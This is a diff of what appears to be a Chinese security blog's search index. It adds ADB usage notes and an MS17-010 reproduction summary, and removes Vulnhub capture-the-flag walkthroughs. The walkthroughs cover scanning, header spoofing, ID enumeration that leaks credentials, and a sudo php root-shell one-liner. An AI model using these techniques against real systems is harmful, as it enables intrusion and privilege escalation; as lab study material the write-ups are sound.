+<h3 id="安装-卸载-APK"><a href="#安装-卸载-APK" class="headerlink" title="安装/卸载 APK"></a>安装/卸载 APK</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb install [-lrtsdg] &lt;path_to_apk&gt;</span></span><br><span class="line"><span class="comment"># -l 	将应用安装到保护目录 /mnt/asec</span></span><br><span class="line"><span class="comment"># -r 	允许覆盖安装</span></span><br><span class="line"><span class="comment"># -t 	允许安装 AndroidManifest.xml 里 application 指定 android:testOnly="true" 的应用</span></span><br><span class="line"><span class="comment"># -s 	将应用安装到 sdcard</span></span><br><span class="line"><span class="comment"># -d 	允许降级覆盖安装</span></span><br><span class="line"><span class="comment"># -g 	授予所有运行时权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细 : &lt;https://github.com/mzlogin/awesome-adb#%E5%AE%89%E8%A3%85-apk&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb uninstall [-k] &lt;packagename&gt;</span></span><br><span class="line"><span class="comment"># &lt;packagename&gt; 表示应用的包名，-k 参数可选，表示卸载应用但保留数据和缓存目录</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb uninstall com.bilibili.comic</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="清除应用数据与缓存"><a href="#清除应用数据与缓存" class="headerlink" title="清除应用数据与缓存"></a>清除应用数据与缓存</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell dumpsys package &lt;packagename&gt;</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm clear com.bilibili.comic</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看应用详细信息"><a href="#查看应用详细信息" class="headerlink" title="查看应用详细信息"></a>查看应用详细信息</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell dumpsys package com.bilibili.comic</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看应用安装路径"><a href="#查看应用安装路径" class="headerlink" title="查看应用安装路径"></a>查看应用安装路径</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell pm path &lt;PACKAGE&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm path com.bilibili.comic </span></span><br><span class="line"><span class="comment"># package:/data/app/com.bilibili.comic-VefU-I3Sq3yFa7hzXBuAXg==/base.apk</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="强制停止应用"><a href="#强制停止应用" class="headerlink" title="强制停止应用"></a>强制停止应用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell am force-stop &lt;packagename&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell am force-stop com.taobao.taoba</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><hr>
+<h3 id="复制设备里的文件到电脑"><a href="#复制设备里的文件到电脑" class="headerlink" title="复制设备里的文件到电脑"></a>复制设备里的文件到电脑</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb pull &lt;设备里的文件路径&gt; [电脑上的目录]</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb pull /sdcard/Pictures ~/Pictures</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="复制电脑里的文件到设备"><a href="#复制电脑里的文件到设备" class="headerlink" title="复制电脑里的文件到设备"></a>复制电脑里的文件到设备</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb push &lt;电脑上的文件路径&gt; &lt;设备里的目录&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb push ~/Documents/Python/hello.py /sdcard/Python</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="模拟按键-输入"><a href="#模拟按键-输入" class="headerlink" title="模拟按键/输入"></a>模拟按键/输入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># input [&lt;source&gt;] &lt;command&gt; [&lt;arg&gt;...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># adb shell input keyevent &lt;keycode&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 亮屏</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell input keyevent 224</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细: &lt;https://github.com/mzlogin/awesome-adb#%E6%A8%A1%E6%8B%9F%E6%8C%89%E9%94%AE%E8%BE%93%E5%85%A5&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="实用功能"><a href="#实用功能" class="headerlink" title="实用功能"></a>实用功能</h2><h3 id="截图保存到电脑"><a href="#截图保存到电脑" class="headerlink" title="截图保存到电脑"></a>截图保存到电脑</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb exec-out screencap -p &gt; sc.png</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="录制屏幕"><a href="#录制屏幕" class="headerlink" title="录制屏幕"></a>录制屏幕</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 录制屏幕以 mp4 格式保存到 /sdcard</span></span><br><span class="line">adb shell screenrecord /sdcard/filename.mp4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按 Ctrl-C 停止</span></span><br><span class="line"><span class="comment"># 默认录制时间和最长录制时间都是 180 秒</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --size WIDTHxHEIGHT 	视频的尺寸，比如 1280x720，默认是屏幕分辨率。</span></span><br><span class="line"><span class="comment"># --bit-rate RATE 	视频的比特率，默认是 4Mbps。</span></span><br><span class="line"><span class="comment"># --time-limit TIME 	录制时长，单位秒。</span></span><br><span class="line"><span class="comment"># --verbose 	输出更多信息。</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Top-amp-amp-ps"><a href="#Top-amp-amp-ps" class="headerlink" title="Top &amp;&amp; ps"></a>Top &amp;&amp; ps</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell top</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell ps</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看进程-UID"><a href="#查看进程-UID" class="headerlink" title="查看进程 UID"></a>查看进程 UID</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell dumpsys package &lt;packagename&gt; | grep userId=</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell dumpsys package com.bilibili.comic | grep userId=</span></span><br><span class="line">    <span class="comment"># userId=10203</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>基本的 linux命令（ls/cat/df/rm/…）</p>
+</blockquote>
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
+<li><a href="https://github.com/mzlogin/awesome-adb#%E6%A8%A1%E6%8B%9F%E6%8C%89%E9%94%AE%E8%BE%93%E5%85%A5" target="_blank" rel="noopener">ADB Usage Complete / ADB 用法大全</a> </li>
+</ul>
+]]></content>
+      <tags>
+        <tag>Android</tag>
       </tags>
   </entry>
   <entry>
@@ -873,6 +974,49 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       </tags>
   </entry>
   <entry>
+    <title>MS17-010复现</title>
+    <url>/2019/09/13/MS17-010%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>MS17-010/EternalBlue/永恒之蓝</p>
+<a id="more"></a>
+
+<p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010" target="_blank" rel="noopener">Microsoft 安全公告 MS17-010</a></p>
+<p>当 Microsoft 服务器消息块 1.0 (SMBv1)服务器处理某些请求时，存在多个远程执行代码漏洞。<br>成功利用这些漏洞的攻击者可以获取在目标系统上执行代码的能力</p>
+<p>受影响的系统(详细系统版本请查看公告)：</p>
+<ul>
+<li>Windows Vista</li>
+<li>Windows Server 2008</li>
+<li>Windows 7</li>
+<li>Windows Server 2008 R2</li>
+<li>Windows 8.1</li>
+<li>Windows Server 2012 和 Windows Server 2012 R2</li>
+<li>Windows RT 8.1</li>
+<li>Windows 10</li>
+<li>Windows Server 2016</li>
+</ul>
+<p>相对应的 CVE（Windows SMB 远程代码执行漏洞）：</p>
+<ul>
+<li>CVE-2017-0143</li>
+<li>CVE-2017-0144</li>
+<li>CVE-2017-0145</li>
+<li>CVE-2017-0146</li>
+<li>CVE-2017-0148</li>
+</ul>
+<br>
+
+<p>复现环境：</p>
+<ul>
+<li>Windows 7 (Build 7601, Service Pack 1)</li>
+<li>Ubuntu server(Metasploit)</li>
+</ul>
+<br>
+
+<p><img src="./2019-09-13-11-24-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="搜索漏洞"><br><img src="./2019-09-13-11-10-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="001" title="扫描模块"><br><img src="./2019-09-13-10-41-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="002" title="返回 meterpreter"></p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Vulnhub靶机——JIS-CTF</title>
     <url>/2020/03/03/JIS-CTF/</url>
     <content><![CDATA[<blockquote>
@@ -1032,539 +1176,6 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
 
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.110/robots.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">################</span></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /backup</span><br><span class="line">Disallow: /admin</span><br><span class="line">Disallow: /admin_area</span><br><span class="line">Disallow: /r00t</span><br><span class="line">Disallow: /uploads      ----- Not Found 404</span><br><span class="line">Disallow: /uploaded_files ----- OK 200</span><br><span class="line">Disallow: /flag </span><br><span class="line">================</span><br><span class="line">http://192.168.56.110/admin_area/</span><br><span class="line"></span><br><span class="line"><span class="comment">##################</span></span><br><span class="line">&lt;!--	username : admin</span><br><span class="line">	password : 3v1l_H@ck3r</span><br><span class="line">	The 2nd flag is : &#123;7412574125871236547895214&#125;</span><br><span class="line">--&gt;</span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/assets/img/</span><br><span class="line"></span><br><span class="line"><span class="comment">################</span></span><br><span class="line">[IMG]	background_tile_1.jpg	2017-04-19 10:43 	2.3K	 </span><br><span class="line">[IMG]	background_tile_2.jpg	2017-04-19 10:43 	2.4K	 </span><br><span class="line">[IMG]	background_tile_3.jpg	2017-04-19 10:43 	2.3K	 </span><br><span class="line">[IMG]	blue_line.jpg	2017-04-19 10:43 	1.3K	 </span><br><span class="line">[IMG]	done.png	2017-04-19 10:43 	3.3K	 </span><br><span class="line">[IMG]	logo.jpg	2017-04-19 10:43 	11K	 </span><br><span class="line">[IMG]	tzine.png	2017-04-19 10:43 	1.2K	 </span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/flag/</span><br><span class="line"></span><br><span class="line"><span class="comment">###############</span></span><br><span class="line">The 1st flag is : &#123;8734509128730458630012095&#125;</span><br><span class="line"></span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/server-status</span><br><span class="line"></span><br><span class="line"><span class="comment">###############</span></span><br><span class="line">注意 Cookie</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##################</span></span><br><span class="line">http://192.168.56.110/index.php</span><br><span class="line"></span><br><span class="line">登录后：</span><br><span class="line"></span><br><span class="line">Powered by : Technawi[dot]net</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======================</span><br><span class="line">meterpreter &gt; cat hint.txt</span><br><span class="line">try to find user technawi password to <span class="built_in">read</span> the flag.txt file, you can find it <span class="keyword">in</span> a hidden file ;)</span><br><span class="line"></span><br><span class="line">The 3rd flag is : &#123;7645110034526579012345670&#125;</span><br><span class="line"></span><br><span class="line">=======================</span><br><span class="line">cat /etc/mysql/conf.d/credentials.txt</span><br><span class="line">The 4th flag is : &#123;7845658974123568974185412&#125;</span><br><span class="line"></span><br><span class="line">username : technawi</span><br><span class="line">password : 3vilH@ksor</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line">technawi@Jordaninfosec-CTF01:~$ cat /var/www/html/flag.txt </span><br><span class="line">The 5th flag is : &#123;5473215946785213456975249&#125;</span><br><span class="line"></span><br><span class="line">Good job :)</span><br><span class="line"></span><br><span class="line">You find 5 flags and got their points and finish the first scenario....</span><br></pre></td></tr></table></figure>
 
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>vulnhub</tag>
-        <tag>OSCP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Vulnhub靶机——Me and My Girlfirend1</title>
-    <url>/2020/03/03/Me-and-My-Girlfirend1/</url>
-    <content><![CDATA[<blockquote>
-<p>2020-02-10-22</p>
-</blockquote>
-<br>
-
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, "Ceban Corp", something has changed from Alice's attitude towards Bob like something is "hidden", And Bob asks for your <span class="keyword">help</span> <span class="keyword">to</span> <span class="keyword">get</span> what Alice <span class="keyword">is</span> hiding <span class="keyword">and</span> <span class="keyword">get</span> <span class="keyword">full</span> <span class="keyword">access</span> <span class="keyword">to</span> the company!</span><br><span class="line"></span><br><span class="line">Difficulty <span class="keyword">Level</span>: Beginner</span><br><span class="line"></span><br><span class="line">Notes: there <span class="keyword">are</span> <span class="number">2</span> flag files</span><br><span class="line"></span><br><span class="line">Learning: Web Application | Simple Privilege Escalation</span><br><span class="line"></span><br><span class="line"><span class="keyword">From</span> : https://www.vulnhub.com/entry/me-<span class="keyword">and</span>-my-girlfriend<span class="number">-1</span>,<span class="number">409</span>/</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">Kali：<span class="number">192.168</span><span class="number">.56</span><span class="number">.109</span></span><br><span class="line"></span><br><span class="line">目标网段：<span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>
-
-<p>显示主机存活扫描：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="image-20200210204802372.png" alt="image-20200210204802372"> </p>
-<br>
-
-<p>排除本机与网关后，找出目标机，扫服务/端口：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>访问 <code>80</code> 端口的 Web页面。显示只有 <code>local</code> 地址才能访问，看源代码，作者给出提示：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Maybe you can search how to use x-forwarded-for --&gt;</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><code>x-forwarded-for</code> ：用来识别通过 HTTP代理或负载均衡方式连接到 Web服务器的客户端<strong>最原始的IP地址</strong>的HTTP请求头字段（就是服务器用来识别客户端原始 IP 地址的）</p>
-<br>
-
-<p>改请求头，添加字段：<code>x-forwarded-for：localhost</code> ，返回页面信息（建议使用 Burp）</p>
-<br>
-
-<p><img src="2020-02-10-18-50-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="postman"> </p>
-<p><img src="2020-02-10-20-58-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<hr>
-<p><strong>NOTE</strong> ： 这里犯了一个错误，在查 <code>x-forwarded-for</code> 的时候，偶然看到了 <code>Postman</code> 也就是上图中的软件，下载、使用、测试浪费了许多时间，且最后越来越麻烦（提交表格、登录），最后便放弃了</p>
-<br>
-
-<p>不是说上图的软件不好用或难用，而是对其一点都不熟悉，不懂套路；<code>Burp</code> 使用不熟练 </p>
-<p>在 Burp 上有更方便的操作方式，后来改之</p>
-<br>
-
-<hr>
-<br>
-
-<p>通过改 <code>x-forwarded-for</code> 值，达到了欺骗服务器并返回数据，页面源代码并无有价值信息</p>
-<br>
-
-<p>既然是 Web 那便开始扫目录：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirsearch.py -u http://192.168.56.111 -e php --random-agents -t 32</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirb http://192.168.56.111</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nikto -h http://192.168.56.111</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-10-18-46-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-10-18-48-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-
-<p>得到地址：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/config/</span><br><span class="line">http://192.168.56.111/index.php/login/</span><br><span class="line">http://192.168.56.111/misc/</span><br><span class="line">http://192.168.56.111/robots.txt        <span class="comment">## /heyhoo.txt  </span></span><br><span class="line">http://192.168.56.111/server-status     <span class="comment">## 404</span></span><br><span class="line">http://192.168.56.111/heyhoo.txt        <span class="comment">### null</span></span><br></pre></td></tr></table></figure>
-
-<p>经访问，下面两个地址返回 <code>200 OK</code> 但却空白，一般是后续填充内容使用：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/config/config.php   	<span class="comment"># 200 OK 返回空白</span></span><br><span class="line">http://192.168.56.111/misc/process.php      <span class="comment"># 200 OK 返回空白</span></span><br></pre></td></tr></table></figure>
-
-<p><code>robot.txt</code> 只有一个限制地址，访问并无又有用价值</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/heyhoo.txt</span><br><span class="line"></span><br><span class="line">http://192.168.56.111/heyhoo.txt	<span class="comment"># 无有用信息</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>最后的几个地址，需要通过修改 <code>x-forwarded-for</code> 值才能访问：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/index.php/login/?page=index	<span class="comment"># Index</span></span><br><span class="line"> </span><br><span class="line">?page=login     <span class="comment">### 登录页面</span></span><br><span class="line">?page=about     <span class="comment">#### 无有价值信息</span></span><br><span class="line">?page=register  <span class="comment">## 注册页面</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-10-21-37-15%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>注册后跳转登录，有三个选项， <code>Dahboard</code> 与 <code>Logout</code> 无甚作用，<code>Profile</code> 会显示你的账号信息</p>
-<p>看源代码，除密码为明文，无其他有价值信息。</p>
-<br>
-
-<p>其实，跳转到 <code>Profile</code> 页的时候，就已经注意到 URL 了：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/misc/process.php?page=profile&amp;user_id=14</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><code>sqlmap</code> 并没有跑出什么，到时在改变数字的时候，底下会出现其他用户的信息</p>
-<br>
-
-<p>从一开始，挨个访问，到 <code>5</code> 的时候，出现了用户名为：<code>alice</code> 的用户，也就是 <code>GirlFriend</code> </p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Name:</span> <span class="string">Alice</span> <span class="string">Geulis</span></span><br><span class="line"><span class="attr">username:</span> <span class="string">alice</span></span><br><span class="line"><span class="attr">passwd:</span> <span class="string">4lic3</span></span><br></pre></td></tr></table></figure>
-
-<br>
-<br>
-
-
-<p><img src="2020-02-10-21-43-00%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-10-19-33-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p>登录 SSH 成功，访问目录得到隐藏文件和 FLAG1。然后就可以提权了</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Flag 1 :</span> <span class="string">gfriEND&#123;2f5f21b2af1b8c3e227bcf35544f8f09&#125;</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-
-
-<p><img src="2020-02-10-19-48-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><br>
-
-<p>执行 <code>sudo -l</code> ，发现了可以使用 <code>php</code> ，执行以下命令，直接提权：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CMD=<span class="string">"/bin/sh"</span></span><br><span class="line">sudo php -r <span class="string">"system('<span class="variable">$CMD</span>');"</span></span><br></pre></td></tr></table></figure>
-
-<p>得到 FLAG2</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">Thanks!</span> <span class="attr">Flag 2:</span> <span class="string">gfriEND&#123;56fbeef560930e77ff984b644fde66e7&#125;</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-
-<p><img src="2020-02-10-22-01-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-10-20-24-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-10-20-23-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>vulnhub</tag>
-        <tag>OSCP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Five86-1</title>
-    <url>/2020/03/10/Five86-1/</url>
-    <content><![CDATA[<blockquote>
-<p><code>2020-02-14 14</code> —— <code>2020-02-14 16</code> </p>
-</blockquote>
-<br>
-
-<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Description</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> another purposely built vulnerable lab <span class="keyword">with</span> <span class="keyword">the</span> intent <span class="keyword">of</span> gaining experience <span class="keyword">in</span> <span class="keyword">the</span> world <span class="keyword">of</span> penetration testing.</span><br><span class="line"></span><br><span class="line">The ultimate goal <span class="keyword">of</span> this challenge <span class="keyword">is</span> <span class="keyword">to</span> <span class="keyword">get</span> root <span class="keyword">and</span> <span class="keyword">to</span> <span class="built_in">read</span> <span class="keyword">the</span> one <span class="keyword">and</span> only flag.</span><br><span class="line"></span><br><span class="line">Linux skills <span class="keyword">and</span> familiarity <span class="keyword">with</span> <span class="keyword">the</span> Linux command line are a must, <span class="keyword">as</span> <span class="keyword">is</span> <span class="keyword">some</span> experience <span class="keyword">with</span> basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be <span class="keyword">of</span> great assistance, <span class="keyword">but</span> you can always tweet <span class="keyword">me</span> <span class="keyword">at</span> @DCAU7 <span class="keyword">for</span> assistance <span class="keyword">to</span> <span class="keyword">get</span> you going again. But take note: I won't give you <span class="keyword">the</span> answer, instead, I'll give you an idea <span class="keyword">about</span> how <span class="keyword">to</span> move forward.</span><br><span class="line"></span><br><span class="line">Technical Information</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> a VirtualBox VM built <span class="keyword">on</span> Debian <span class="number">64</span> bit, <span class="keyword">but</span> there shouldn't be any issues <span class="built_in">running</span> <span class="keyword">it</span> <span class="keyword">on</span> most PCs.</span><br><span class="line"></span><br><span class="line">Five86<span class="number">-1</span> has been tested successfully <span class="keyword">on</span> VMWare Player, <span class="keyword">but</span> <span class="keyword">if</span> there are any issues <span class="built_in">running</span> this VM <span class="keyword">in</span> VMware, have a <span class="built_in">read</span> <span class="keyword">through</span> <span class="keyword">of</span> this.</span><br><span class="line"></span><br><span class="line">It <span class="keyword">is</span> currently configured <span class="keyword">for</span> Bridged Networking, however, this can be changed <span class="keyword">to</span> suit your requirements. Networking <span class="keyword">is</span> configured <span class="keyword">for</span> DHCP.</span><br><span class="line"></span><br><span class="line">Installation <span class="keyword">is</span> simple - download <span class="keyword">it</span>, unzip <span class="keyword">it</span>, <span class="keyword">and</span> <span class="keyword">then</span> import <span class="keyword">it</span> <span class="keyword">into</span> VirtualBox <span class="keyword">or</span> VMWare <span class="keyword">and</span> away you go.</span><br><span class="line"></span><br><span class="line">Important</span><br><span class="line">While there should be no problems using this VM, <span class="keyword">by</span> downloading <span class="keyword">it</span>, you accept full responsibility <span class="keyword">for</span> any unintentional damage <span class="keyword">that</span> this VM may cause.</span><br><span class="line"></span><br><span class="line">In saying <span class="keyword">that</span>, there shouldn't be any problems, <span class="keyword">but</span> I feel <span class="keyword">the</span> need <span class="keyword">to</span> throw this out there just <span class="keyword">in</span> case.</span><br><span class="line"></span><br><span class="line">Credits</span><br><span class="line">A big thanks goes out <span class="keyword">to</span> <span class="keyword">the</span> members <span class="keyword">of</span> @m0tl3ycr3w.</span><br><span class="line"></span><br><span class="line">Contact</span><br><span class="line">I'm also very interested <span class="keyword">in</span> hearing how people go <span class="keyword">about</span> solving these challenges, so <span class="keyword">if</span> you're up <span class="keyword">for</span> writing a walkthrough, please do so <span class="keyword">and</span> send <span class="keyword">me</span> a link, <span class="keyword">or</span> alternatively, follow <span class="keyword">me</span> <span class="keyword">on</span> Twitter, <span class="keyword">and</span> DM <span class="keyword">me</span> (you can unfollow <span class="keyword">after</span> you've DM'd <span class="keyword">me</span> <span class="keyword">if</span> you'd prefer).</span><br><span class="line"></span><br><span class="line">I can be contacted via Twitter - @Five86_x</span><br></pre></td></tr></table></figure>
-
-<br>
-<br>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kali : 192.168.56.109</span><br><span class="line">目标网段 : 192.168.56.1/24</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>
-
-<p>主机存活：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -s -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
-
-<p>扫服务：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.114</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<hr>
-<br>
-
-<p>访问 80 端口，无有价值信息</p>
-<p>例行扫目录：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u http://192.168.56.114 -e php --random-agents</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-14-35-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>经访问：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">########################</span></span><br><span class="line">[14:35:21] 200 -   30B  - /index.html    <span class="comment"># 404</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports          <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports/Webalizer/   <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 200 -   29B  - /robots.txt</span><br><span class="line"><span class="comment">#####</span></span><br><span class="line">http://192.168.56.114/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /ona</span><br><span class="line"><span class="comment">########################</span></span><br><span class="line">http://192.168.56.114/ona	<span class="comment"># OpenNetAdmin</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-14-45-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>搜索相关漏洞，得到远程命令执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-02-14-14-44-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<h2 id="海滩登陆"><a href="#海滩登陆" class="headerlink" title="海滩登陆"></a>海滩登陆</h2><br>
-
